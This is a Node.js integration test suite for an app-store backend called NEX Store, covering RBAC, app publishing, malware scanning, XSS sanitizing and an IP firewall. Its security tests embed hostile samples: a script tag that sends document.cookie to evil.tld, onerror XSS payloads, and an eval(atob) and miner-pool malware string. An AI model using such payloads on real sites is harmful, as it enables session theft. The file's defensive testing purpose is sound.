/**
 * © 2026 NEX STORE & DEVTECHS001 LABS. ALL RIGHTS RESERVED.
 * STRICTLY PROPRIETARY & CONFIDENTIAL — DO NOT SHARE, REDISTRIBUTE, OR PIRATE THIS CODE.
 *
 * End-to-End Node.js Test Suite (node:test) covering:
 * 1. Fetching Netlify App Resources & Visual Asset Pipeline
 * 2. Uploading, Publishing, Editing, Installing, Sandboxing & Uninstalling Apps
 * 3. App Security Systems (5-Stage Anti-Malware, XSS Shield, IP Firewall & Abuse Reports)
 * 4. Server Nodes, Multi-Cloud Hosting (Netlify/Render) & Dual-Engine SQLite + MongoDB
 * 5. System Logs (Terminal CLI Logs, Inventory Logs, Activity Events & Security Audit Logs)
 * 6. Admins (.env Root Admin), Developers & Users RBAC Authentication & Permission Boundaries
 */

process.env.NEX_TEST_NO_LISTEN = '1';

import { describe, it, before, after } from 'node:test';
import assert from 'node:assert/strict';
import { app, server } from '../server/index.js';
import { db } from '../server/db.js';
import {
  getEnvAdminConfig,
  detectXssAttempt,
  sanitizeObjectPayloads,
  verifyAppRealnessAndMalware
} from '../server/envAndSecurity.js';
import {
  getProductArtUrl,
  getAppArtUrl,
  getAppVisualResources
} from '../src/utils/storeEngine.js';

let baseUrl = '';
let adminToken = '';
let devAetherToken = '';
let userAmaraToken = '';
let uploadedAppId = '';
let createdReportId = '';
let createdServerId = '';

async function apiRequest(path, { method = 'GET', body, token, headers = {} } = {}) {
  const reqHeaders = {
    'Content-Type': 'application/json',
    ...headers
  };
  if (token) {
    reqHeaders.Authorization = `Bearer ${token}`;
  }
  const res = await fetch(`${baseUrl}${path}`, {
    method,
    headers: reqHeaders,
    body: body !== undefined ? JSON.stringify(body) : undefined
  });
  const contentType = res.headers.get('content-type') || '';
  const data = contentType.includes('application/json') ? await res.json() : await res.text();
  return { status: res.status, ok: res.ok, data, headers: res.headers };
}

describe('NEX Store Full-Stack Verification & Integration Suite', () => {
  before(async () => {
    await new Promise((resolve) => {
      server.listen(0, '127.0.0.1', () => {
        const addr = server.address();
        baseUrl = `http://127.0.0.1:${addr.port}`;
        resolve();
      });
    });
  });

  after(async () => {
    if (uploadedAppId) {
      db.prepare('DELETE FROM app_installs WHERE app_id = ?').run(uploadedAppId);
      db.prepare('DELETE FROM apps WHERE id = ?').run(uploadedAppId);
    }
    if (createdReportId) {
      db.prepare('DELETE FROM security_reports WHERE id = ?').run(createdReportId);
    }
    if (createdServerId) {
      db.prepare('DELETE FROM server_nodes WHERE id = ?').run(createdServerId);
    }
    await new Promise((resolve) => server.close(resolve));
  });

  // ============================================================================
  // 1. ADMINS (.ENV), DEVELOPERS & USERS RBAC AUTHENTICATION
  // ============================================================================
  describe('1. Admins (.env Root Admin), Developers & Users Authentication & RBAC', () => {
    it('authenticates Root Admin strictly from .env credentials with unrestricted ["*"] permissions', async () => {
      const envAdmin = getEnvAdminConfig();
      const res = await apiRequest('/api/auth/login', {
        method: 'POST',
        body: {
          identifier: envAdmin.username,
          password: envAdmin.password
        }
      });
      assert.equal(res.status, 200);
      assert.ok(res.data.token);
      assert.equal(res.data.account.role, 'admin');
      assert.equal(res.data.account.source, '.env');
      assert.deepEqual(res.data.account.permissions, ['*']);
      adminToken = res.data.token;

      const cfgRes = await apiRequest('/api/auth/config', { token: adminToken });
      assert.equal(cfgRes.status, 200);
      assert.equal(cfgRes.data.adminUsernameHint, 'nex_root_admin');
      assert.equal(cfgRes.data.envAdminConfigured, true);

      const progRes = await apiRequest('/api/developer/my-progress', { token: adminToken });
      assert.equal(progRes.status, 200);
      assert.equal(progRes.data.unrestrictedAccess, true);
    });

    it('rejects invalid Root Admin password attempts and logs security event', async () => {
      const res = await apiRequest('/api/auth/login', {
        method: 'POST',
        body: {
          identifier: 'nex_root_admin',
          password: 'WrongPassword123!'
        }
      });
      assert.equal(res.status, 401);
      assert.ok(res.data.error);
    });

    it('authenticates Developer account (@aether_labs) with scoped developer permissions', async () => {
      const res = await apiRequest('/api/auth/login', {
        method: 'POST',
        body: {
          identifier: 'aether_labs',
          password: 'DevPass2026!'
        }
      });
      assert.equal(res.status, 200);
      assert.ok(res.data.token);
      assert.equal(res.data.account.role, 'developer');
      assert.equal(res.data.account.username, 'aether_labs');
      assert.ok(res.data.account.permissions.includes('publish_app'));
      assert.ok(!res.data.account.permissions.includes('*'));
      devAetherToken = res.data.token;
    });

    it('authenticates Shopper/User account (@amara_nbo) with standard user permissions', async () => {
      const res = await apiRequest('/api/auth/login', {
        method: 'POST',
        body: {
          identifier: 'amara_nbo',
          password: 'Shopper2026!'
        }
      });
      assert.equal(res.status, 200);
      assert.ok(res.data.token);
      assert.equal(res.data.account.role, 'user');
      assert.equal(res.data.account.username, 'amara_nbo');
      userAmaraToken = res.data.token;
    });

    it('registers a new Developer account via POST /api/auth/register and verifies scoped progress', async () => {
      const uniqueUsername = `dev_qa_${Date.now().toString(36)}`;
      const res = await apiRequest('/api/auth/register', {
        method: 'POST',
        body: {
          username: uniqueUsername,
          email: `${uniqueUsername}@nexstore.dev`,
          password: 'QaDevPassword2026!',
          display_name: 'QA Automation Developer',
          role: 'developer',
          company: 'NEX QA Labs'
        }
      });
      assert.equal(res.status, 201);
      assert.equal(res.data.account.role, 'developer');
      assert.equal(res.data.account.username, uniqueUsername);

      const progressRes = await apiRequest(`/api/developer/my-progress?username=${uniqueUsername}`, {
        token: res.data.token
      });
      assert.equal(progressRes.status, 200);
      assert.equal(progressRes.data.unrestrictedAccess, false);
      assert.equal(progressRes.data.username, uniqueUsername);

      // Clean up temporary registered developer account
      db.prepare('DELETE FROM user_accounts WHERE username = ?').run(uniqueUsername);
    });

    it('enforces RBAC: blocks Developer @aether_labs from editing another dev app or scaling another dev deployment, while allowing Root Admin (.env)', async () => {
      // Find an app not owned by aether_labs
      const otherDevApp = db
        .prepare("SELECT * FROM apps WHERE LOWER(developer) NOT LIKE '%aether%' LIMIT 1")
        .get();
      assert.ok(otherDevApp);

      // Developer @aether_labs tries to edit another developer's app -> 403
      const forbiddenAppEdit = await apiRequest(`/api/apps/${otherDevApp.id}`, {
        method: 'PATCH',
        token: devAetherToken,
        body: { version: '9.9.9' }
      });
      assert.equal(forbiddenAppEdit.status, 403);
      assert.ok(forbiddenAppEdit.data.error.includes('RBAC Restriction'));

      // Find a deployment owned by rustcore_sys
      const rustcoreDeploy = db
        .prepare("SELECT * FROM hosting_deployments WHERE owner_username = 'rustcore_sys' LIMIT 1")
        .get();
      assert.ok(rustcoreDeploy);

      // Developer @aether_labs tries to scale @rustcore_sys deployment -> 403
      const forbiddenScale = await apiRequest(`/api/hosting/${rustcoreDeploy.id}/scale`, {
        method: 'PATCH',
        token: devAetherToken,
        body: { current_instances: 4 }
      });
      assert.equal(forbiddenScale.status, 403);
      assert.ok(forbiddenScale.data.error.includes('RBAC Restriction'));

      // Root Admin (.env) scales @rustcore_sys deployment -> 200 OK
      const adminScale = await apiRequest(`/api/hosting/${rustcoreDeploy.id}/scale`, {
        method: 'PATCH',
        token: adminToken,
        body: { current_instances: 3 }
      });
      assert.equal(adminScale.status, 200);
      assert.equal(adminScale.data.deployment.current_instances, 3);
    });
  });

  // ============================================================================
  // 2. FETCHING NETLIFY APP RESOURCES & VISUAL ASSET PIPELINE
  // ============================================================================
  describe('2. Fetching Netlify App Resources & Visual Asset Pipeline', () => {
    it('fetches & extracts Netlify app resources via POST /api/apps/inspect-url', async () => {
      const res = await apiRequest('/api/apps/inspect-url', {
        method: 'POST',
        body: { url: 'https://quantum-circuit-studio.netlify.app' }
      });
      assert.equal(res.status, 200);
      const inspected = res.data.inspected;
      assert.ok(inspected);
      assert.equal(inspected.source_provider, 'Netlify');
      assert.ok(inspected.name.toLowerCase().includes('quantum'));
      assert.ok(Array.isArray(inspected.resources) && inspected.resources.length >= 4);
      assert.ok(inspected.resources.some((r) => r.name === 'og-preview-banner.svg'));
      assert.ok(inspected.resources.some((r) => r.name === 'nex-app-manifest.json'));
      assert.ok(inspected.resources.some((r) => r.name === 'nex-copyright-drm.cert'));
      assert.ok(inspected.drmNotice.includes('DO NOT SHARE'));
    });

    it('fetches NEX Store Pro production Netlify URL (https://nex-store-pro.netlify.app) resources', async () => {
      const res = await apiRequest('/api/apps/inspect-url', {
        method: 'POST',
        body: { url: 'https://nex-store-pro.netlify.app' }
      });
      assert.equal(res.status, 200);
      assert.equal(res.data.inspected.source_provider, 'Netlify');
      assert.ok(res.data.inspected.live_url.includes('nex-store-pro.netlify.app'));
      assert.ok(res.data.inspected.ai_analysis && res.data.inspected.ai_analysis.architectureScore === 99);
    });

    it('renders SVG app artwork via GET /api/app-art/:id.svg and client-side 4-view HD visual resources', async () => {
      const firstApp = db.prepare('SELECT * FROM apps LIMIT 1').get();
      const svgRes = await apiRequest(`/api/app-art/${firstApp.id}.svg`);
      assert.equal(svgRes.status, 200);
      assert.ok(String(svgRes.data).includes('<svg'));
      assert.ok(String(svgRes.data).includes('DRM PROTECTED'));

      const visualResources = getAppVisualResources(firstApp);
      assert.equal(visualResources.length, 4);
      for (const item of visualResources) {
        assert.ok(item.url.startsWith('data:image/svg+xml;charset=utf-8,'));
      }
      assert.ok(getAppArtUrl(firstApp).startsWith('data:image/svg+xml;charset=utf-8,'));

      const prodRow = db.prepare('SELECT * FROM products LIMIT 1').get();
      assert.ok(getProductArtUrl(prodRow, { view: 'hero' }).startsWith('data:image/svg+xml;charset=utf-8,'));
    });
  });

  // ============================================================================
  // 3. UPLOADING, PUBLISHING, EDITING, INSTALLING & SANDBOXING APPS
  // ============================================================================
  describe('3. Uploading, Publishing, Editing, Installing & Sandboxing Apps', () => {
    it('uploads & publishes a new Netlify app via POST /api/developer/publish', async () => {
      const res = await apiRequest('/api/developer/publish', {
        method: 'POST',
        token: devAetherToken,
        body: {
          name: 'Netlify Edge Neural Profiler',
          description: 'Live WebGPU & Netlify Edge latency profiler with automated flamegraphs.',
          version: '2.1.0',
          category: 'devtools',
          language: 'typescript',
          platforms: ['web', 'linux', 'macos'],
          developer: 'aether_labs',
          developer_email: 'elena@aetherlabs.io',
          developer_website: 'https://neural-profiler.netlify.app',
          developer_bio: 'Principal Systems Architect at Aether Labs',
          package_type: 'app',
          source_provider: 'Netlify',
          live_url: 'https://neural-profiler.netlify.app',
          repo_url: 'https://github.com/devTechs001/nex-store',
          license: 'Proprietary',
          price: 'Free',
          size: '16.4 MB',
          icon: '⚡',
          resources: [
            { type: 'image', name: 'og-preview-banner.svg', url: '/api/app-art/neural-profiler.svg', size: '28 KB' },
            { type: 'bundle', name: 'netlify-edge-bundle.js', url: 'https://neural-profiler.netlify.app', size: '1.6 MB' }
          ],
          ai_capabilities: ['Automated Flamegraph Anomaly Detection', 'Edge Cold-Start Predictor']
        }
      });
      assert.equal(res.status, 201);
      assert.ok(res.data.app && res.data.app.id);
      assert.equal(res.data.app.name, 'Netlify Edge Neural Profiler');
      assert.equal(res.data.app.source_provider, 'Netlify');
      assert.equal(res.data.app.developer, 'aether_labs');
      uploadedAppId = res.data.app.id;
    });

    it('retrieves full app details, developer bio, and resources via GET /api/apps/:id/details', async () => {
      const res = await apiRequest(`/api/apps/${uploadedAppId}/details`);
      assert.equal(res.status, 200);
      assert.equal(res.data.app.id, uploadedAppId);
      assert.equal(res.data.developerProfile.email, 'elena@aetherlabs.io');
      assert.ok(Array.isArray(res.data.app.resources) && res.data.app.resources.length >= 2);
      assert.ok(res.data.installation.sandboxUrl.includes(uploadedAppId));
    });

    it('updates the uploaded app version & changelog via PATCH /api/apps/:id as owning developer', async () => {
      const res = await apiRequest(`/api/apps/${uploadedAppId}`, {
        method: 'PATCH',
        token: devAetherToken,
        body: {
          version: '2.2.0',
          changelog: 'Added zero-copy WebAssembly trace buffer export.'
        }
      });
      assert.equal(res.status, 200);
      assert.equal(res.data.app.version, '2.2.0');
    });

    it('installs the uploaded app into SQLite app_installs via POST /api/apps/:id/install & renders sandbox runtime', async () => {
      const installRes = await apiRequest(`/api/apps/${uploadedAppId}/install`, {
        method: 'POST',
        token: devAetherToken
      });
      assert.equal(installRes.status, 201);
      assert.equal(installRes.data.installRecord.app_id, uploadedAppId);
      assert.equal(installRes.data.installRecord.status, 'INSTALLED');

      const sandboxRes = await apiRequest(`/api/sandbox/${uploadedAppId}`);
      assert.equal(sandboxRes.status, 200);
      assert.ok(String(sandboxRes.data).includes('Netlify Edge Neural Profiler'));
      assert.ok(String(sandboxRes.data).includes('<canvas id="sandbox-canvas"'));
    });

    it('uninstalls the app via DELETE /api/apps/:id/uninstall', async () => {
      const uninstRes = await apiRequest(`/api/apps/${uploadedAppId}/uninstall`, {
        method: 'DELETE',
        token: devAetherToken
      });
      assert.equal(uninstRes.status, 200);
      assert.ok(!uninstRes.data.appInstalls.some((i) => i.app_id === uploadedAppId));
    });
  });

  // ============================================================================
  // 4. APP SECURITY SYSTEMS (ANTI-MALWARE, XSS SHIELD, IP FIREWALL & REPORTS)
  // ============================================================================
  describe('4. App Security Systems (5-Stage Anti-Malware, XSS Shield, IP Firewall & Reports)', () => {
    it('executes 5-stage App Realness, Compatibility & Anti-Malware verification via POST /api/apps/:id/verify-and-scan', async () => {
      const res = await apiRequest(`/api/apps/${uploadedAppId}/verify-and-scan`, {
        method: 'POST',
        body: { targetOs: 'linux-x86_64' }
      });
      assert.equal(res.status, 200);
      assert.equal(res.data.verificationReport.malwareFree, true);
      assert.equal(res.data.verificationReport.verifiedReal, true);
      assert.equal(res.data.verificationReport.stages.length, 5);
    });

    it('quarantines malicious app payloads with trojan/crypto-miner signatures in verifyAppRealnessAndMalware()', () => {
      const badReport = verifyAppRealnessAndMalware({
        id: 'app-bad-miner',
        name: 'Crypto Miner Trojan',
        version: '1.0.0',
        developer: 'unknown',
        source_provider: 'Unknown',
        description: 'Runs eval(atob("payload")) and stratum+tcp://evil.pool:3333 with keylogger',
        live_url: 'https://bad.example.org'
      });
      assert.equal(badReport.malwareFree, false);
      assert.equal(badReport.verifiedReal, false);
      assert.ok(badReport.detectedThreats.length >= 3);
      assert.equal(badReport.stages[1].status, 'BLOCKED');
    });

    it('intercepts & sanitizes HTTP requests containing XSS attack vectors (<script>) and logs WAF security report', async () => {
      const beforeEvents = db.prepare("SELECT COUNT(*) as c FROM security_events WHERE event_type = 'waf_xss_sanitized'").get().c;
      const firstProd = db.prepare('SELECT * FROM products LIMIT 1').get();

      const xssRes = await apiRequest('/api/reviews', {
        method: 'POST',
        body: {
          product_id: firstProd.id,
          reviewer_name: 'XSS Sentinel Tester',
          rating: 5,
          title: 'Great GPU <script>fetch("https://evil.tld/steal?c="+document.cookie)</script>',
          comment: 'Testing WAF XSS shield onerror=alert(1)'
        }
      });
      assert.equal(xssRes.status, 201);
      // Verify the stored review had <script> and onerror= stripped by the XSS middleware
      assert.ok(!xssRes.data.review.title.includes('<script>'));
      assert.ok(!xssRes.data.review.comment.includes('onerror='));

      const afterEvents = db.prepare("SELECT COUNT(*) as c FROM security_events WHERE event_type = 'waf_xss_sanitized'").get().c;
      assert.ok(afterEvents > beforeEvents, 'Expected waf_xss_sanitized event to be recorded in security_events');

      // Clean up test review
      db.prepare('DELETE FROM reviews WHERE id = ?').run(xssRes.data.review.id);

      // Also verify unit helpers
      assert.equal(detectXssAttempt('<img src=x onerror=alert(1)>')?.detected, true);
      const sanitized = sanitizeObjectPayloads({ msg: 'Hello <script>bad()</script>' });
      assert.ok(!sanitized.msg.includes('<script>'));
    });

    it('enforces IP Blocklist Firewall (POST /api/security/blocked-ips -> 403 Firewall Block -> DELETE unblock)', async () => {
      const testIp = '203.0.113.249';

      // Non-admin user cannot add firewall block -> 403
      const userAttempt = await apiRequest('/api/security/blocked-ips', {
        method: 'POST',
        token: userAmaraToken,
        body: { ip_address: testIp, reason: 'Unauthorized attempt' }
      });
      assert.equal(userAttempt.status, 403);

      // Root Admin adds IP to firewall blocklist -> 201
      const blockRes = await apiRequest('/api/security/blocked-ips', {
        method: 'POST',
        token: adminToken,
        body: {
          ip_address: testIp,
          cidr_range: `${testIp}/32`,
          reason: 'Automated Integration Test Firewall Rule',
          threat_level: 'critical'
        }
      });
      assert.equal(blockRes.status, 201);
      assert.ok(blockRes.data.blockedIps.some((b) => b.ip_address === testIp));

      // Request arriving from blocked IP is rejected with 403
      const blockedReq = await apiRequest('/api/products', {
        headers: { 'x-simulated-client-ip': testIp }
      });
      assert.equal(blockedReq.status, 403);
      assert.ok(blockedReq.data.error.includes('blocked by NEX Zero-Trust Firewall'));

      // Root Admin unblocks the IP -> 200
      const unblockRes = await apiRequest(`/api/security/blocked-ips/${testIp}`, {
        method: 'DELETE',
        token: adminToken
      });
      assert.equal(unblockRes.status, 200);

      // Request from previously blocked IP now succeeds -> 200
      const allowedReq = await apiRequest('/api/products', {
        headers: { 'x-simulated-client-ip': testIp }
      });
      assert.equal(allowedReq.status, 200);
    });

    it('submits & resolves Security/Malware Abuse Reports via /api/security/reports', async () => {
      const submitRes = await apiRequest('/api/security/reports', {
        method: 'POST',
        token: userAmaraToken,
        body: {
          target_type: 'app',
          target_id: uploadedAppId,
          category: 'Suspicious Sandbox Permission',
          severity: 'high',
          description: 'Automated test report verifying security incident triage workflow.'
        }
      });
      assert.equal(submitRes.status, 201);
      createdReportId = submitRes.data.report.id;

      // Root Admin resolves the report
      const resolveRes = await apiRequest(`/api/security/reports/${createdReportId}`, {
        method: 'PATCH',
        token: adminToken,
        body: {
          status: 'RESOLVED_CLEAN',
          resolution_notes: 'Verified SHA-256 signature and sandbox isolation.'
        }
      });
      assert.equal(resolveRes.status, 200);
      const resolvedRow = resolveRes.data.securityReports.find((r) => r.id === createdReportId);
      assert.ok(resolvedRow && resolvedRow.status === 'RESOLVED_CLEAN');
    });
  });

  // ============================================================================
  // 5. SERVERS, MULTI-CLOUD HOSTING (NETLIFY/RENDER) & MONGODB + SQLITE
  // ============================================================================
  describe('5. Edge Servers, Netlify/Render Cloud Hosting & Dual-Engine SQLite + MongoDB', () => {
    it('verifies /api/health and /api/bootstrap with 28 SQLite tables, server nodes & cloud deployments', async () => {
      const healthRes = await apiRequest('/api/health');
      assert.equal(healthRes.status, 200);
      assert.equal(healthRes.data.status, 'healthy');
      assert.ok(healthRes.data.database.totalTables >= 28);

      const bootRes = await apiRequest('/api/bootstrap');
      assert.equal(bootRes.status, 200);
      assert.ok(bootRes.data.products.length >= 12);
      assert.ok(bootRes.data.apps.length >= 8);
      assert.ok(bootRes.data.serverNodes.length >= 6);
      assert.ok(bootRes.data.hostingDeployments.length >= 4);
    });

    it('provisions a new Edge Server Node via POST /api/servers and triggers server actions', async () => {
      const createRes = await apiRequest('/api/servers', {
        method: 'POST',
        token: adminToken,
        body: {
          name: 'NEX-EDGE-TEST-NBO-02',
          region: 'Nairobi, KE (af-south-1)',
          ip_address: '10.240.18.99'
        }
      });
      assert.equal(createRes.status, 201);
      createdServerId = createRes.data.serverNodes[createRes.data.serverNodes.length - 1].id;

      const actionRes = await apiRequest(`/api/servers/${createdServerId}/action`, {
        method: 'POST',
        token: adminToken,
        body: { action: 'scale' }
      });
      assert.equal(actionRes.status, 200);
      assert.ok(actionRes.data.serverNodes.some((n) => n.id === createdServerId));
    });

    it('verifies Netlify & Render hosting environment config and deploys a cloud service', async () => {
      const envRes = await apiRequest('/api/hosting/env-config', { token: adminToken });
      assert.equal(envRes.status, 200);
      assert.ok(envRes.data.renderVars.length >= 18);
      assert.ok(envRes.data.netlifyVars.length >= 12);
      assert.ok(envRes.data.netlifyToml.includes('nex-store-lj5j.onrender.com'));

      const deployRes = await apiRequest('/api/hosting/deploy', {
        method: 'POST',
        token: devAetherToken,
        body: {
          app_name: 'aether-qa-edge-worker',
          provider: 'Netlify',
          environment: 'production',
          region: 'Global Edge Network',
          memory_mb: 1024,
          deploy_url: 'https://aether-qa-edge-worker.netlify.app'
        }
      });
      assert.equal(deployRes.status, 201);
      assert.equal(deployRes.data.deployment.provider, 'Netlify');
      assert.equal(deployRes.data.deployment.owner_username, 'aether_labs');
      db.prepare('DELETE FROM hosting_deployments WHERE id = ?').run(deployRes.data.deployment.id);
    });

    it('queries and inserts BSON documents into the MongoDB Atlas Engine (/api/mongo/*)', async () => {
      const statusRes = await apiRequest('/api/mongo/status');
      assert.equal(statusRes.status, 200);
      assert.equal(statusRes.data.connected, true);

      const queryRes = await apiRequest('/api/mongo/query', {
        method: 'POST',
        body: {
          collection: 'apps',
          filter: { source_provider: 'Netlify' },
          limit: 10
        }
      });
      assert.equal(queryRes.status, 200);
      assert.ok(queryRes.data.matchedCount >= 1);

      const insertRes = await apiRequest('/api/mongo/insert', {
        method: 'POST',
        body: {
          collection: 'products',
          document: {
            name: 'Mongo BSON Test Accelerator',
            category: 'compute',
            price: 1299
          }
        }
      });
      assert.equal(insertRes.status, 201);
      assert.ok(insertRes.data.inserted._id.$oid);
    });
  });

  // ============================================================================
  // 6. SYSTEM LOGS (TERMINAL CLI, INVENTORY, ACTIVITY & SECURITY LOGS)
  // ============================================================================
  describe('6. System Logs (Terminal CLI, Inventory, Activity & Security Audit Logs)', () => {
    it('executes NEX-SH v4.0 CLI commands via POST /api/terminal/exec and logs to terminal_logs', async () => {
      const execRes = await apiRequest('/api/terminal/exec', {
        method: 'POST',
        token: adminToken,
        body: {
          command: 'status',
          actor: 'nex_root_admin@nex-store'
        }
      });
      assert.equal(execRes.status, 200);
      assert.equal(execRes.data.exitCode, 0);
      assert.ok(execRes.data.output.length > 10);
      assert.ok(execRes.data.terminalLogs.length >= 1);
    });

    it('updates product stock via PATCH /api/products/:id and records inventory_logs & activity_events', async () => {
      const prod = db.prepare('SELECT * FROM products LIMIT 1').get();
      assert.ok(prod);
      const res = await apiRequest(`/api/products/${prod.id}`, {
        method: 'PATCH',
        token: adminToken,
        body: {
          stock: prod.stock + 2,
          stockReason: 'Automated QA Inventory Log Test'
        }
      });
      assert.equal(res.status, 200);
      assert.equal(res.data.product.stock, prod.stock + 2);
      assert.ok(res.data.inventoryLogs.some((l) => l.reason.includes('Automated QA Inventory Log Test')));

      // Restore original stock
      db.prepare('UPDATE products SET stock = ? WHERE id = ?').run(prod.stock, prod.id);
    });

    it('exports terminal_logs, inventory_logs, security_events & activity_events in JSON and CSV formats', async () => {
      for (const table of ['terminal_logs', 'inventory_logs', 'security_events', 'activity_events']) {
        const jsonRes = await apiRequest(`/api/export/${table}`);
        assert.equal(jsonRes.status, 200);
        assert.equal(jsonRes.data.table, table);
        assert.ok(Array.isArray(jsonRes.data.rows) && jsonRes.data.rows.length >= 1);
      }

      const csvRes = await apiRequest('/api/export/terminal_logs?format=csv');
      assert.equal(csvRes.status, 200);
      assert.ok(String(csvRes.data).includes('command'));
    });

    it('executes the live /api/tests/run endpoint and verifies 100% pass rate across all 6 suites', async () => {
      const runRes = await apiRequest('/api/tests/run', {
        method: 'POST',
        token: adminToken
      });
      assert.equal(runRes.status, 200);
      assert.equal(runRes.data.status, 'ALL_PASSED');
      assert.equal(runRes.data.totalSuites, 6);
      assert.equal(runRes.data.totalFailed, 0);
      assert.ok(runRes.data.totalPassed >= 22);
    });
  });
});
